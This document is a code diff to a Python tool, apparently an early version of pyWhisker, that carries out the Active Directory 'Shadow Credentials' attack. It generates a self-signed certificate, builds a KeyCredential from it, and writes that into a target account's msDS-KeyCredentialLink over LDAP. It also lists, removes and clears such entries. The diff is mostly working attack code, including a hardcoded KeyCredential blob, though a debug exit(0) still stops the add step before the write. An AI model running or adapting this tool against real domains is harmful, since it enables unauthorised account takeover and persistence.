@@ -219,7 +219,7 @@ class ShadowCredentials(object):
         self.ldap_session = ldap_session
         self.delegate_from = None
         self.target_samname = target_samname
-        self.SID_delegate_from = None
+        self.target_dn = None
         logging.debug('Initializing domainDumper()')
         cnf = ldapdomaindump.domainDumpConfig()
         cnf.basepath = None
@@ -233,8 +233,9 @@ class ShadowCredentials(object):
             logging.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            logging.info("Target user found: %s" % result[0])
-        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+            self.target_dn = result[0]
+            logging.info("Target user found: %s" % self.target_dn)
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
             if entry['type'] != 'searchResEntry':
@@ -249,10 +250,10 @@ class ShadowCredentials(object):
             else:
                 logging.info("Listing devices for %s" % self.target_samname)
                 for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
-                    kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
-                    logging.info("DeviceID: %s | Creation Time (UTC): %s" % (kc.DeviceId, kc.KeyCreationTime))
-                    for key in kc._data.keys():
-                        logging.debug("%s: %s" % (key, kc._data[key]))
+                    keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
+                    logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId, keyCredential.KeyCreationTime))
+                    for key in keyCredential._data.keys():
+                        logging.debug("%s: %s" % (key, keyCredential._data[key]))
         except IndexError:
             logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
@@ -269,7 +270,8 @@ class ShadowCredentials(object):
             logging.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            logging.info("Target user found: %s" % result[0])
+            self.target_dn = result[0]
+            logging.info("Target user found: %s" % self.target_dn)
         logging.info("Generating certificate")
         # create rsa key pair object
         key = OpenSSL.crypto.PKey()
@@ -288,38 +290,23 @@ class ShadowCredentials(object):
         cert.set_pubkey(key)
         # self-sign certificate with SHA256 digest and PKCS1 padding scheme
         cert.sign(key, 'sha512')
+        logging.info("Certificate generated")
 
         # Create a PKCS12 container
         # pk = OpenSSL.crypto.PKCS12()
         # pk.set_certificate(cert)
         # pk.export()
 
-
-        # Preparing export to bcrypt
-        pubkey = RSA.importKey(OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_PEM, key))
-        Magic = b"RSA1"
-        BitLength = struct.pack("<I", key.bits())
-        cbPublicExp = struct.pack("<I", len(long_to_bytes(pubkey.e)))
-        cbModulus = struct.pack("<I", len(long_to_bytes(pubkey.n)))
-        # todo : temporaire, pour correspondre aux keycredentials
-        cbPrime1 = struct.pack("<I", 0)
-        cbPrime2 = struct.pack("<I", 0)
-        # todo : il manque 3 bytes dans le header (\x01\x00\x01) je sais pas pourquoi
-        idontknowwhatthisis = b"\x01\x00\x01"
-        bcryptheader = Magic + BitLength + cbPublicExp + cbModulus + cbPrime1 + cbPrime2 + idontknowwhatthisis
-        brcryptdata = bcryptheader + OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_ASN1, key)[33:-5]
-        print(brcryptdata)
-
-
-        logging.info("Certificate generated")
         logging.info("Generating KeyCredential")
-
+        guid = "64c21c1d-b1e8-4c89-b936-91cfb32548cf"
+        # keyCredential = b'B:828:000200002000010931771AA15D0D2C55F90085364F9105A8FF8EF5F7D29EAFB68D25FE9327BAA42000029B7190E48CCBF5985D4C9775B1CFB56BE4153CA99CE4DEE6AC4943EEEC5A86DD1B0103525341310008000003000000000100000000000000000000010001BC8830BAB8E09BF812656E00FA7EEB4D83CF710EB072C4F19F540537CD51756720537BFD157238E92567B68D68AD548758324FBA1FDEE0AA08D3ED9963D03EF9BB4BB8CB9158D7AA767F6BCF52912BDD7FA5C4D3EDBAB481885DC9F0F46C1AF79554128C103869DAFA0847229F59543A2F8AEAF538F30C5634C1B6C87F9F8CCD2E79241503C7754D23E66DA6BAF97CBD3BD4B7964D5FB7EAFEA70B8BB1AF9DB77319F6F9CF0EEBE16AF878A1038BF75CBC73B2E20D4A9F48D64236921D997924DD59E8951F9F6B3A813CEF78D8D386CD9FE1704E0A44F88F5E90265C07F0733143E173CBD4165E890F3B8AC533BF0A8BEBE66560BDB996C408472A33C9E2F87101000401010005001000061D1CC264E8B1894CB93691CFB32548CF0200070100080008ECFFF45A0F7FD701080009ECFFF45A0F7FD701:CN=user2,CN=Users,DC=domain,DC=local'
+        # todo
+        # guid = Guid()
+        keyCredential = KeyCredential.fromX509Certificate(certificate=cert, deviceId=guid, owner=self.target_dn, currentTime=datetime.datetime.utcnow())
+        print(keyCredential)
         exit(0)
-        kc = KeyCredential()
-
-        kc = b'B:828:000200002000010931771AA15D0D2C55F90085364F9105A8FF8EF5F7D29EAFB68D25FE9327BAA42000029B7190E48CCBF5985D4C9775B1CFB56BE4153CA99CE4DEE6AC4943EEEC5A86DD1B0103525341310008000003000000000100000000000000000000010001BC8830BAB8E09BF812656E00FA7EEB4D83CF710EB072C4F19F540537CD51756720537BFD157238E92567B68D68AD548758324FBA1FDEE0AA08D3ED9963D03EF9BB4BB8CB9158D7AA767F6BCF52912BDD7FA5C4D3EDBAB481885DC9F0F46C1AF79554128C103869DAFA0847229F59543A2F8AEAF538F30C5634C1B6C87F9F8CCD2E79241503C7754D23E66DA6BAF97CBD3BD4B7964D5FB7EAFEA70B8BB1AF9DB77319F6F9CF0EEBE16AF878A1038BF75CBC73B2E20D4A9F48D64236921D997924DD59E8951F9F6B3A813CEF78D8D386CD9FE1704E0A44F88F5E90265C07F0733143E173CBD4165E890F3B8AC533BF0A8BEBE66560BDB996C408472A33C9E2F87101000401010005001000061D1CC264E8B1894CB93691CFB32548CF0200070100080008ECFFF45A0F7FD701080009ECFFF45A0F7FD701:CN=user2,CN=Users,DC=domain,DC=local'
         logging.info("KeyCredential generated with DevideID: %s" % "BLAHBLAHBLAH <3")
-        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
             if entry['type'] != 'searchResEntry':
@@ -329,9 +316,9 @@ class ShadowCredentials(object):
             logging.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [kc]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential]
             logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
-            self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.ldap_session.result['result'] == 0:
                 logging.info("Updated the msDS-KeyCredentialLink attribute of the target object")
                 # todo : print the cert in a Rubeus/getTGT synthax, or: save it to a file, confirm it's saved, show Rubeus/getTGT synthax
@@ -354,8 +341,9 @@ class ShadowCredentials(object):
             logging.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            logging.info("Target user found: %s" % result[0])
-        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+            self.target_dn = result[0]
+            logging.info("Target user found: %s" % self.target_dn)
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
             if entry['type'] != 'searchResEntry':
@@ -376,7 +364,7 @@ class ShadowCredentials(object):
                     new_values.append(dn_binary_value)
             if device_id_in_current_values == True:
                 logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
-                self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                 if self.ldap_session.result['result'] == 0:
                     logging.info("Updated the msDS-KeyCredentialLink attribute of the target object")
                 else:
@@ -400,8 +388,9 @@ class ShadowCredentials(object):
             logging.error('Target account does not exist! (wrong domain?)')
             return
         else:
-            logging.info("Target user found: %s" % result[0])
-        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+            self.target_dn = result[0]
+            logging.info("Target user found: %s" % self.target_dn)
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
             if entry['type'] != 'searchResEntry':
@@ -415,7 +404,7 @@ class ShadowCredentials(object):
                 logging.info('Attribute msDS-KeyCredentialLink is empty')
             else:
                 logging.info("Clearing the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
-                self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
                 if self.ldap_session.result['result'] == 0:
                     logging.info('msDS-KeyCredentialLink cleared successfully!')
                 else:
@@ -589,7 +578,7 @@ def main():
             shadowcreds.remove(args.device_id)
         elif args.action == 'clear':
             shadowcreds.clear()
-        # todo : add an "info" that will print all information of a keycredential given its deviceid, kind of kc.show() Impacket compliant
+        # todo : add an "info" that will print all information of a keycredential given its deviceid, kind of keyCredential.show() Impacket compliant
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
